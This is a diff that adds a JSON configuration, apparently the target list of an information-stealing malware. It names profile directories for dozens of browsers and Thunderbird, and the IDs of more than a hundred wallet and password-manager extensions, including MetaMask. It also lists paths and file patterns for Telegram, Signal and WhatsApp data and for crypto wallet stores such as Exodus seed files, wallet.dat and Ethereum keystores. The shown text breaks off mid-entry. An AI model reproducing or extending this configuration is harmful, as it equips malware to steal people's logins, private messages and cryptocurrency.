@@ -1,0 +1,2369 @@
+{
+    "b": [
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome SxS\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome Beta\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome Dev\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome Unstable\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c8",
+            "p": "\\Local\\Google\\Chrome Canary\\User Data",
+            "t": 1,
+            "pn": "chrome.exe"
+        },
+        {
+            "n": "b\\c20",
+            "p": "\\Local\\Epic Privacy Browser\\User Data",
+            "t": 1,
+            "pn": "epic.exe"
+        },
+        {
+            "n": "b\\c15",
+            "p": "\\Local\\Vivaldi\\User Data",
+            "t": 1,
+            "pn": "vivaldi.exe"
+        },
+        {
+            "n": "b\\c26",
+            "p": "\\Local\\360Browser\\Browser\\User Data",
+            "t": 1,
+            "pn": "browser360.exe"
+        },
+        {
+            "n": "b\\c19",
+            "p": "\\Local\\CocCoc\\Browser\\User Data",
+            "t": 1,
+            "pn": "cococ.exe"
+        },
+        {
+            "n": "b\\c6",
+            "p": "\\Local\\K-Melon\\User Data",
+            "t": 1,
+            "pn": "k-meleon.exe"
+        },
+        {
+            "n": "b\\c12",
+            "p": "\\Local\\Orbitum\\User Data",
+            "t": 1,
+            "pn": "orbitum.exe"
+        },
+        {
+            "n": "b\\c17",
+            "p": "\\Local\\Torch\\User Data",
+            "t": 1,
+            "pn": "torch.exe"
+        },
+        {
+            "n": "b\\c22",
+            "p": "\\Local\\CentBrowser\\User Data",
+            "t": 1,
+            "pn": "centbrowser.exe"
+        },
+        {
+            "n": "b\\c23",
+            "p": "\\Local\\Chromium\\User Data",
+            "t": 1,
+            "pn": "chromium.exe"
+        },
+        {
+            "n": "b\\c30",
+            "p": "\\Local\\Chedot\\User Data",
+            "t": 1,
+            "pn": "chedot.exe"
+        },
+        {
+            "n": "b\\c31",
+            "p": "\\Local\\Kometa\\User Data",
+            "t": 1,
+            "pn": "kometa.exe"
+        },
+        {
+            "n": "b\\c33",
+            "p": "\\Local\\Uran\\User Data",
+            "t": 1,
+            "pn": "uran.exe"
+        },
+        {
+            "n": "b\\c37",
+            "p": "\\Local\\liebao\\User Data",
+            "t": 1,
+            "pn": "liebao.exe"
+        },
+        {
+            "n": "b\\c38",
+            "p": "\\Local\\QIP Surf\\User Data",
+            "t": 1,
+            "pn": "qip.exe"
+        },
+        {
+            "n": "b\\c39",
+            "p": "\\Local\\Nichrome\\User Data",
+            "t": 1,
+            "pn": "nichrome.exe"
+        },
+        {
+            "n": "b\\c40",
+            "p": "\\Local\\Chromodo\\User Data",
+            "t": 1,
+            "pn": "chromodo.exe"
+        },
+        {
+            "n": "b\\c36",
+            "p": "\\Local\\Coowon\\Coowon\\User Data",
+            "t": 1,
+            "pn": "coowon.exe"
+        },
+        {
+            "n": "b\\c35",
+            "p": "\\Local\\CatalinaGroup\\Citrio\\User Data",
+            "t": 1,
+            "pn": "citrio.exe"
+        },
+        {
+            "n": "b\\c33",
+            "p": "\\Local\\uCozMedia\\Uran\\User Data",
+            "t": 1,
+            "pn": "uran.exe"
+        },
+        {
+            "n": "b\\c32",
+            "p": "\\Local\\Elements Browser\\User Data",
+            "t": 1,
+            "pn": "ElementsBrowser.exe"
+        },
+        {
+            "n": "b\\c27",
+            "p": "\\Local\\MapleStudio\\ChromePlus\\User Data",
+            "t": 1,
+            "pn": "ChromePlus.exe"
+        },
+        {
+            "n": "b\\c18",
+            "p": "\\Local\\Maxthon3\\User Data",
+            "t": 1,
+            "pn": "maxthon.exe"
+        },
+        {
+            "n": "b\\c16",
+            "p": "\\Local\\Amigo\\User\\User Data",
+            "t": 1,
+            "pn": "amigo.exe"
+        },
+        {
+            "n": "b\\c10",
+            "p": "\\Local\\BraveSoftware\\Brave-Browser\\User Data",
+            "t": 1,
+            "pn": "brave.exe"
+        },
+        {
+            "n": "b\\c9",
+            "p": "\\Local\\Microsoft\\Edge\\User Data",
+            "t": 1,
+            "pn": "msedge.exe"
+        },
+        {
+            "n": "b\\c13",
+            "p": "\\Roaming\\Opera Software\\Opera Stable",
+            "t": 1,
+            "pn": "opera.exe"
+        },
+        {
+            "n": "b\\c13",
+            "p": "\\Roaming\\Opera Software\\Opera GX Stable",
+            "t": 1,
+            "pn": "opera.exe"
+        },
+        {
+            "n": "b\\c13",
+            "p": "\\Local\\Opera Software\\Opera Neon\\User Data",
+            "t": 1,
+            "pn": "opera.exe"
+        },
+        {
+            "n": "b\\g1",
+            "p": "\\Roaming\\Mozilla\\Firefox\\Profiles",
+            "t": 2,
+            "pn": "firefox.exe"
+        },
+        {
+            "n": "b\\g21",
+            "p": "\\Roaming\\NETGATE Technologies\\BlackHawk\\Profiles",
+            "t": 2,
+            "pn": "blackhawk.exe"
+        },
+        {
+            "n": "b\\g7",
+            "p": "\\Roaming\\TorBro\\Profile",
+            "t": 2,
+            "pn": "tor.exe"
+        },
+        {
+            "n": "b\\g3",
+            "p": "\\Roaming\\Thunderbird\\Profiles",
+            "t": 2,
+            "pn": "thunderbird.exe"
+        }
+    ],
+    "exW": [
+        {
+            "id": "niicfdmlahlkepapldhhaphnjjfnphjd",
+            "n": "w179"
+        },
+        {
+            "id": "pdliaogehgdbhbnmkklieghmmjkpigpa",
+            "n": "w180"
+        },
+        {
+            "id": "cmbagcoinhmacpcgmbiniijboejgiahi",
+            "n": "w181"
+        },
+        {
+            "id": "ihbkbpflehggfohemfjnpacabjfijoig",
+            "n": "w182"
+        },
+        {
+            "id": "eihkinmlanhkfnjhjjndkfjjmhjnmakj",
+            "n": "w183"
+        },
+        {
+            "id": "acdamagkdfmpkclpoglgnbddngblgibo",
+            "n": "w184"
+        },
+        {
+            "id": "okejhknhopdbemmfefjglkdfdhpfmflg",
+            "n": "w185"
+        },
+        {
+            "id": "gojhcdgcpbpfigcaejpfhfegekdgiblk",
+            "n": "w186"
+        },
+        {
+            "id": "dgcgofdhhddbmmpolmgcdofiohgklpkk",
+            "n": "w187"
+        },
+        {
+            "id": "gmokbcggjdnladpodigacleogmiaenmk",
+            "n": "w188"
+        },
+        {
+            "id": "bfogbkbpcmpakgjhnklcikpgafallbak",
+            "n": "w189"
+        },
+        {
+            "id": "mijjdbgpgbflkaooedaemnlciddmamai",
+            "n": "w190"
+        },
+        {
+            "id": "nphplpgoakhhjchkkhmiggakijnkhfnd",
+            "n": "w176"
+        },
+        {
+            "id": "fldfpgipfncgndfolcbkdeeknbbbnhcc",
+            "n": "w177"
+        },
+        {
+            "id": "omaabbefbmiijedngplfjmnooppbclkk",
+            "n": "w178"
+        },
+        {
+            "id": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
+            "n": "w4"
+        },
+        {
+            "id": "lodccjjbdhfakaekdiahmedfbieldgik",
+            "n": "w5"
+        },
+        {
+            "id": "hcflpincpppdclinealmandijcmnkbgn",
+            "n": "w6"
+        },
+        {
+            "id": "bcopgchhojmggmffilplmbdicgaihlkp",
+            "n": "w7"
+        },
+        {
+            "id": "fhmfendgdocmcbmfikdcogofphimnkno",
+            "n": "w1"
+        },
+        {
+            "id": "kpfopkelmapcoipemfendmdcghnegimn",
+            "n": "w2"
+        },
+        {
+            "id": "fhbohimaelbohpjbbldcngcnapndodjp",
+            "n": "w3"
+        },
+        {
+            "id": "cnmamaachppnkjgnildpdmkaakejnhae",
+            "n": "w8"
+        },
+        {
+            "id": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
+            "n": "w9"
+        },
+        {
+            "id": "amkmjjmmflddogmhpjloimipbofnfjih",
+            "n": "w13"
+        },
+        {
+            "id": "cphhlgmgameodnhkjdmkpanlelnlohao",
+            "n": "w14"
+        },
+        {
+            "id": "kncchdigobghenbbaddojjnnaogfppfj",
+            "n": "w15"
+        },
+        {
+            "id": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
+            "n": "w16"
+        },
+        {
+            "id": "ffnbelfdoeiohenkjibnmadjiehjhajb",
+            "n": "w10"
+        },
+        {
+            "id": "pdgbckgdncnhihllonhnjbdoighgpimk",
+            "n": "w11"
+        },
+        {
+            "id": "ookjlbkiijinhpmnjffcofjonbfbgaoc",
+            "n": "w12"
+        },
+        {
+            "id": "mnfifefkajgofkcjkemidiaecocnkjeh",
+            "n": "w17"
+        },
+        {
+            "id": "flpiciilemghbmfalicajoolhkkenfel",
+            "n": "w18"
+        },
+        {
+            "id": "jfdlamikmbghhapbgfoogdffldioobgl",
+            "n": "w19"
+        },
+        {
+            "id": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+            "n": "w23"
+        },
+        {
+            "id": "aiifbnbfobpmeekipheeijimdpnlpgpp",
+            "n": "w24"
+        },
+        {
+            "id": "aeachknmefphepccionboohckonoeemg",
+            "n": "w25"
+        },
+        {
+            "id": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
+            "n": "w26"
+        },
+        {
+            "id": "nknhiehlklippafakaeklbeglecifhad",
+            "n": "w27"
+        },
+        {
+            "id": "dmkamcknogkgcdfhhbddcghachkejeap",
+            "n": "w28"
+        },
+        {
+            "id": "jnmbobjmhlngoefaiojfljckilhhlhcj",
+            "n": "w29"
+        },
+        {
+            "id": "klnaejjgbibmhlephnhpmaofohgkpgkd",
+            "n": "w20"
+        },
+        {
+            "id": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
+            "n": "w21"
+        },
+        {
+            "id": "ejbalbakoplchlghecdalmeeeajnimhm",
+            "n": "w22"
+        },
+        {
+            "id": "kjmoohlgokccodicjjfebfomlbljgfhk",
+            "n": "w30"
+        },
+        {
+            "id": "fnjhmkhhmkbjkkabndcnnogagogbneec",
+            "n": "w31"
+        },
+        {
+            "id": "nhnkbkgjikgcigadomkphalanndcapjk",
+            "n": "w32"
+        },
+        {
+            "id": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+            "n": "w33"
+        },
+        {
+            "id": "cihmoadaighcejopammfbmddcmdekcje",
+            "n": "w34"
+        },
+        {
+            "id": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+            "n": "w35"
+        },
+        {
+            "id": "djclckkglechooblngghdinmeemkbgci",
+            "n": "w36"
+        },
+        {
+            "id": "jiidiaalihmmhddjgbnbgdfflelocpak",
+            "n": "w37"
+        },
+        {
+            "id": "lgmpcpglpngdoalbgeoldeajfclnhafa",
+            "n": "w38"
+        },
+        {
+            "id": "egjidjbpglichdcondbcbdnbeeppgdph",
+            "n": "w40"
+        },
+        {
+            "id": "flhbololhdbnkpnnocoifnopcapiekdi",
+            "n": "w41"
+        },
+        {
+            "id": "kkhmbjifakpikpapdiaepgkdephjgnma",
+            "n": "w42"
+        },
+        {
+            "id": "apbldaphppcdfbdnnogdikheafliigcf",
+            "n": "w43"
+        },
+        {
+            "id": "ckdjpkejmlgmanmmdfeimelghmdfeobe",
+            "n": "w44"
+        },
+        {
+            "id": "iodngkohgeogpicpibpnaofoeifknfdo",
+            "n": "w45"
+        },
+        {
+            "id": "hnefghmjgbmpkjjfhefnenfnejdjneog",
+            "n": "w46"
+        },
+        {
+            "id": "fpcamiejgfmmhnhbcafmnefbijblinff",
+            "n": "w47"
+        },
+        {
+            "id": "egdddjbjlcjckiejbbaneobkpgnmpknp",
+            "n": "w48"
+        },
+        {
+            "id": "nihlebdlccjjdejgocpogfpheakkpodb",
+            "n": "w49"
+        },
+        {
+            "id": "ilbibkgkmlkhgnpgflcjdfefbkpehoom",
+            "n": "w50"
+        },
+        {
+            "id": "oiaanamcepbccmdfckijjolhlkfocbgj",
+            "n": "w51"
+        },
+        {
+            "id": "ldpmmllpgnfdjkmhcficcifgoeopnodc",
+            "n": "w52"
+        },
+        {
+            "id": "mbcafoimmibpjgdjboacfhkijdkmjocd",
+            "n": "w53"
+        },
+        {
+            "id": "jbdpelninpfbopdfbppfopcmoepikkgk",
+            "n": "w54"
+        },
+        {
+            "id": "onapnnfmpjmbmdcipllnjmjdjfonfjdm",
+            "n": "w55"
+        },
+        {
+            "id": "cfdldlejlcgbgollnbonjgladpgeogab",
+            "n": "w56"
+        },
+        {
+            "id": "ablbagjepecncofimgjmdpnhnfjiecfm",
+            "n": "w57"
+        },
+        {
+            "id": "fdfigkbdjmhpdgffnbdbicdmimfikfig",
+            "n": "w58"
+        },
+        {
+            "id": "njojblnpemjkgkchnpbfllpofaphbokk",
+            "n": "w59"
+        },
+        {
+            "id": "hjagdglgahihloifacmhaigjnkobnnih",
+            "n": "w60"
+        },
+        {
+            "id": "mcohilncbfahbmgdjkbpemcciiolgcge",
+            "n": "w99"
+        },
+        {
+            "id": "jbdaocneiiinmjbjlgalhcelgbejmnid",
+            "n": "w100"
+        },
+        {
+            "id": "blnieiiffboillknjnepogjhkgnoapac",
+            "n": "w101"
+        },
+        {
+            "id": "cjelfplplebdjjenllpjcblmjkfcffne",
+            "n": "w102"
+        },
+        {
+            "id": "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
+            "n": "w103"
+        },
+        {
+            "id": "kkpllkodjeloidieedojogacfhpaihoh",
+            "n": "w104"
+        },
+        {
+            "id": "nanjmdknhkinifnkgdcggcfnhdaammmj",
+            "n": "w105"
+        },
+        {
+            "id": "nkddgncdjgjfcddamfgcmfnlhccnimig",
+            "n": "w106"
+        },
+        {
+            "id": "acmacodkjbdgmoleebolmdjonilkdbch",
+            "n": "w107"
+        },
+        {
+            "id": "phkbamefinggmakgklpkljjmgibohnba",
+            "n": "w108"
+        },
+        {
+            "id": "efbglgofoippbgcjepnhiblaibcnclgk",
+            "n": "w109"
+        },
+        {
+            "id": "lpfcbjknijpeeillifnkikgncikgfhdo",
+            "n": "w110"
+        },
+        {
+            "id": "ejjladinnckdgjemekebdpeokbikhfci",
+            "n": "w111"
+        },
+        {
+            "id": "opcgpfmipidbgpenhmajoajpbobppdil",
+            "n": "w112"
+        },
+        {
+            "id": "aholpfdialjgjfhomihkjbmgjidlcdno",
+            "n": "w113"
+        },
+        {
+            "id": "onhogfjeacnfoofkfgppdlbmlmnplgbn",
+            "n": "w114"
+        },
+        {
+            "id": "mopnmbcafieddcagagdcbnhejhlodfdd",
+            "n": "w115"
+        },
+        {
+            "id": "fijngjgcjhjmmpcmkeiomlglpeiijkld",
+            "n": "w116"
+        },
+        {
+            "id": "hifafgmccdpekplomjjkcfgodnhcellj",
+            "n": "w117"
+        },
+        {
+            "id": "ijmpgkjfkbfhoebgogflfebnmejmfbm",
+            "n": "w118"
+        },
+        {
+            "id": "lkcjlnjfpbikmcmbachjpdbijejflpcm",
+            "n": "w119"
+        },
+        {
+            "id": "onofpnbbkehpmmoabgpcpmigafmmnjh",
+            "n": "w120"
+        },
+        {
+            "id": "dkdedlpgdmmkkfjabffeganieamfklkm",
+            "n": "w121"
+        },
+        {
+            "id": "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
+            "n": "w122"
+        },
+        {
+            "id": "infeboajgfhgbjpjbeppbkgnabfdkdaf",
+            "n": "w123"
+        },
+        {
+            "id": "ppbibelpcjmhbdihakflkdcoccbgbkpo",
+            "n": "w124"
+        },
+        {
+            "id": "klghhnkeealcohjjanjjdaeeggmfmlpl",
+            "n": "w125"
+        },
+        {
+            "id": "enabgbdfcbaehmbigakijjabdpdnimlg",
+            "n": "w126"
+        },
+        {
+            "id": "mmmjbcfofconkannjonfmjjajpllddbg",
+            "n": "w127"
+        },
+        {
+            "id": "bifidjkcdpgfnlbcjpdkdcnbiooooblg",
+            "n": "w128"
+        },
+        {
+            "id": "nebnhfamliijlghikdgcigoebonmoibm",
+            "n": "w129"
+        },
+        {
+            "id": "fcfcfllfndlomdhbehjjcoimbgofdncg",
+            "n": "w130"
+        },
+        {
+            "id": "ojggmchlghnjlapmfbnjholfjkiidbch",
+            "n": "w131"
+        },
+        {
+            "id": "dlcobpjiigpikoobohmabehhmhfoodbb",
+            "n": "w132"
+        },
+        {
+            "id": "jnlgamecbpmbajjfhmmmlhejkemejdma",
+            "n": "w133"
+        },
+        {
+            "id": "kbdcddcmgoplfockflacnnefaehaiocb",
+            "n": "w134"
+        },
+        {
+            "id": "kgdijkcfiglijhaglibaidbipiejjfdp",
+            "n": "w135"
+        },
+        {
+            "id": "epapihdplajcdnnkdeiahlgigofloibg",
+            "n": "w136"
+        },
+        {
+            "id": "mgffkfbidihjpoaomajlbgchddlicgpn",
+            "n": "w137"
+        },
+        {
+            "id": "ebfidpplhabeedpnhjnobghokpiioolj",
+            "n": "w138"
+        },
+        {
+            "id": "dngmlblcodfobpdpecaadgfbcggfjfnm",
+            "n": "w139"
+        },
+        {
+            "id": "ldinpeekobnhjjdofggfgjlcehhmanlj",
+            "n": "w140"
+        },
+        {
+            "id": "mdjmfdffdcmnoblignmgpommbefadffd",
+            "n": "w141"
+        },
+        {
+            "id": "aflkmfhebedbjioipglgcbcmnbpgliof",
+            "n": "w142"
+        },
+        {
+            "id": "dmjmllblpcbmniokccdoaiahcdajdjof",
+            "n": "w143"
+        },
+        {
+            "id": "lnnnmfcpbkafcpgdilckhmhbkkbpkmid",
+            "n": "w144"
+        },
+        {
+            "id": "odpnjmimokcmjgojhnhfcnalnegdjmdn",
+            "n": "w145"
+        },
+        {
+            "id": "bopcbmipnjdcdfflfgjdgdjejmgpoaab",
+            "n": "w146"
+        },
+        {
+            "id": "cpmkedoipcpimgecpmgpldfpohjplkpp",
+            "n": "w147"
+        },
+        {
+            "id": "khpkpbbcccdmmclmpigdgddabeilkdpd",
+            "n": "w148"
+        },
+        {
+            "id": "mcbigmjiafegjnnogedioegffbooigli",
+            "n": "w149"
+        },
+        {
+            "id": "fiikommddbeccaoicoejoniammnalkfa",
+            "n": "w150"
+        },
+        {
+            "id": "heefohaffomkkkphnlpohglngmbcclhi",
+            "n": "w151"
+        },
+        {
+            "id": "ocjdpmoallmgmjbbogfiiaofphbjgchh",
+            "n": "w152"
+        },
+        {
+            "id": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
+            "n": "w153"
+        },
+        {
+            "id": "kfdniefadaanbjodldohaedphafoffoh",
+            "n": "w154"
+        },
+        {
+            "id": "kmhcihpebfmpgmihbkipmjlmmioameka",
+            "n": "w155"
+        },
+        {
+            "id": "gafhhkghbfjjkeiendhlofajokpaflmk",
+            "n": "w156"
+        },
+        {
+            "id": "kglcipoddmbniebnibibkghfijekllbl",
+            "n": "w157"
+        },
+        {
+            "id": "iokeahhehimjnekafflcihljlcjccdbe",
+            "n": "w158"
+        },
+        {
+            "id": "idnnbdplmphpflfnlkomgpfbpcgelopg",
+            "n": "w159"
+        },
+        {
+            "id": "kmphdnilpmdejikjdnlbcnmnabepfgkh",
+            "n": "w160"
+        },
+        {
+            "id": "cgeeodpfagjceefieflmdfphplkenlfk",
+            "n": "w161"
+        },
+        {
+            "id": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
+            "n": "w162"
+        },
+        {
+            "id": "odbfpeeihdkbihmopkbjmoonfanlbfcl",
+            "n": "w163"
+        },
+        {
+            "id": "fhilaheimglignddkjgofkcbgekhenbh",
+            "n": "w164"
+        },
+        {
+            "id": "aodkkagnadcbobfpggfnjeongemjbjca",
+            "n": "w165"
+        },
+        {
+            "id": "dngmlblcodfobpdpecaadgfbcggfjfnm",
+            "n": "w166"
+        },
+        {
+            "id": "lpilbniiabackdjcionkobglmddfbcjo",
+            "n": "w167"
+        },
+        {
+            "id": "bhhhlbepdkbapadjdnnojkbgioiodbic",
+            "n": "w168"
+        },
+        {
+            "id": "jnkelfanjkeadonecabehalmbgpfodjm",
+            "n": "w169"
+        },
+        {
+            "id": "jgaaimajipbpdogpdglhaphldakikgef",
+            "n": "w170"
+        },
+        {
+            "id": "kppfdiipphfccemcignhifpjkapfbihd",
+            "n": "w171"
+        },
+        {
+            "id": "loinekcabhlmhjjbocijdoimmejangoa",
+            "n": "w172"
+        },
+        {
+            "id": "anokgmphncpekkhclmingpimjmcooifb",
+            "n": "w173"
+        },
+        {
+            "id": "cnncmdhjacpkmjmkcafchppbnpnhdmon",
+            "n": "w174"
+        },
+        {
+            "id": "mkpegjkblkkefacfnmkajcjmabijhclg",
+            "n": "w175"
+        }
+    ],
+    "exP": [
+        {
+            "id": "eiaeiblijfjekdanodkjadfinkhbfgcd",
+            "n": "p108"
+        },
+        {
+            "id": "hlcjpjebakkiaolkpceofenleehjgeca",
+            "n": "p111"
+        },
+        {
+            "id": "jappahmbjadeffilgnfiofdpcoodcjbg",
+            "n": "p112"
+        },
+        {
+            "id": "gehmmocbbkpblljhkekmfhjpfbkclbph",
+            "n": "p114"
+        },
+        {
+            "id": "jnhjknbfnclancjpknceboifoegiompf",
+            "n": "p115"
+        },
+        {
+            "id": "pnlccmojcmeohlpggmfnbbiapkmbliob",
+            "n": "p61"
+        },
+        {
+            "id": "ljfpcifpgbbchoddpjefaipoiigpdmag",
+            "n": "p62"
+        },
+        {
+            "id": "bhghoamapcdpbohphigoooaddinpkbai",
+            "n": "p63"
+        },
+        {
+            "id": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
+            "n": "p65"
+        },
+        {
+            "id": "imloifkgjagghnncjkhggdhalmcnfklk",
+            "n": "p66"
+        },
+        {
+            "id": "oeljdldpnmdbchonielidgobddffflal",
+            "n": "p67"
+        },
+        {
+            "id": "ilgcnhelpchnceeipipijaljkblbcobl",
+            "n": "p68"
+        },
+        {
+            "id": "nngceckbapebfimnlniiiahkandclblb",
+            "n": "p69"
+        },
+        {
+            "id": "oboonakemofpalcgghocfoadofidjkkk",
+            "n": "p70"
+        },
+        {
+            "id": "fdjamakpfbbddfjaooikfcpapjohcfmg",
+            "n": "p71"
+        },
+        {
+            "id": "fooolghllnmhmmndgjiamiiodkpenpbb",
+            "n": "p72"
+        },
+        {
+            "id": "bfogiafebfohielmmehodmfbbebbbpei",
+            "n": "p73"
+        },
+        {
+            "id": "lfochlioelphaglamdcakfjemolpichk",
+            "n": "p74"
+        },
+        {
+            "id": "hdokiejnpimakedhajhdlcegeplioahd",
+            "n": "p75"
+        },
+        {
+            "id": "naepdomgkenhinolocfifgehidddafch",
+            "n": "p76"
+        },
+        {
+            "id": "bmikpgodpkclnkgmnpphehdgcimmided",
+            "n": "p77"
+        },
+        {
+            "id": "nofkfblpeailgignhkbnapbephdnmbmn",
+            "n": "p78"
+        },
+        {
+            "id": "jhfjfclepacoldmjmkmdlmganfaalklb",
+            "n": "p79"
+        },
+        {
+            "id": "chgfefjpcobfbnpmiokfjjaglahmnded",
+            "n": "p80"
+        },
+        {
+            "id": "igkpcodhieompeloncfnbekccinhapdb",
+            "n": "p81"
+        },
+        {
+            "id": "cfhdojbkjhnklbpkdaibdccddilifddb",
+            "n": "p82"
+        },
+        {
+            "id": "kmmkllgcgpldbblpnhghdojehhfafhro",
+            "n": "p83"
+        },
+        {
+            "id": "ibegklajigjlbljkhfpenpfoadebkokl",
+            "n": "p84"
+        },
+        {
+            "id": "ijpdbdidkomoophdnnnfoancpbbmpfcn",
+            "n": "p85"
+        },
+        {
+            "id": "llalnijpibhkmpdamakhgmcagghgmjab",
+            "n": "p86"
+        },
+        {
+            "id": "mjdmgoiobnbombmnbbdllfncjcmopfnc",
+            "n": "p87"
+        },
+        {
+            "id": "ekkhlihjnlmjenikbgmhgjkknoelfped",
+            "n": "p88"
+        },
+        {
+            "id": "jngbikilcgcnfdbmnmnmnleeomffciml",
+            "n": "p89"
+        },
+        {
+            "id": "hcjginnbdlkdnnahogchmeidnmfckjom",
+            "n": "p90"
+        },
+        {
+            "id": "ogphgbfmhodmnmpnaadpbdadldbnmjji",
+            "n": "p91"
+        },
+        {
+            "id": "hhmkpbimapjpajpicehcnmhdgagpfmjc",
+            "n": "p92"
+        },
+        {
+            "id": "ojhpaddibjnpiefjkbhkfiaedepjheca",
+            "n": "p93"
+        },
+        {
+            "id": "fmhjnpmdlhokfidldlglfhkkfhjdmhgl",
+            "n": "p94"
+        },
+        {
+            "id": "gjhohodkpobnogbepojmopnaninookhj",
+            "n": "p95"
+        },
+        {
+            "id": "hmglflngjlhgibbmcedpdabjmcmboamo",
+            "n": "p96"
+        },
+        {
+            "id": "eklfjjkfpbnioclagjlmklgkcfmgmbpg",
+            "n": "p97"
+        },
+        {
+            "id": "jbkfoedolllekgbhcbcoahefnbanhhlh",
+            "n": "p98"
+        },
+        {
+            "id": "kfmlopbepahlcjbkfnnklglgibbopkbk",
+            "n": "p140"
+        }
+    ],
+    "exG": [
+        {
+            "id": "webextension@metamask.io",
+            "n": "w22"
+        }
+    ],
+    "sM": [
+        {
+            "a": "m",
+            "n": "m\\3",
+            "p": "\\Roaming\\Tox",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\4",
+            "p": "\\Roaming\\Psi\\profiles\\default",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\5",
+            "p": "\\Roaming\\Psi\u002B\\profiles\\default",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\6",
+            "p": "\\Roaming\\WhatsApp\\Local Storage\\leveldb",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\7",
+            "p": "\\Roaming\\Signal",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "config.json",
+                "*.sqlite"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\2",
+            "p": "\\Roaming\\Telegram Desktop\\tdata",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*s"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "m",
+            "n": "m\\1",
+            "p": "\\Roaming\\.purple",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "accounts.xml"
+            ],
+            "tp": 2
+        }
+    ],
+    "sW": [
+        {
+            "a": "w",
+            "n": "w\\40",
+            "p": "\\Monero\\wallets",
+            "t": 1,
+            "r": true,
+            "gl": 3,
+            "f": [
+                "*"
+            ],
+            "tp": 5
+        },
+        {
+            "a": "w",
+            "n": "w\\9",
+            "p": "\\Roaming\\Zcash",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wallet*dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\21",
+            "p": "\\Roaming\\Guarda\\Local Storage\\leveldb",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\22",
+            "p": "\\Roaming\\WalletWasabi\\Client\\Wallets",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*.json"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\1",
+            "p": "\\Roaming\\Armory",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\11",
+            "p": "\\Roaming\\DashCore\\wallets",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\4",
+            "p": "\\Roaming\\Bitcoin\\wallets",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "wallet.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\19",
+            "p": "\\Roaming\\Binance",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "app-store.json",
+                "simple-storage.json",
+                "*finger-print*",
+                "window-state.json"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\3",
+            "p": "\\Roaming\\Electrum\\wallets",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\16",
+            "p": "\\Roaming\\Electrum-LTC\\wallets",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\5",
+            "p": "\\Roaming\\Ethereum",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "keystore"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\7",
+            "p": "\\Roaming\\Exodus",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "exodus.conf.json",
+                "window-state.json",
+                "passphrase.json",
+                "seed.seco",
+                "info.seco"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\23",
+            "p": "\\Roaming\\Anoncoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\24",
+            "p": "\\Roaming\\BBQCoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\25",
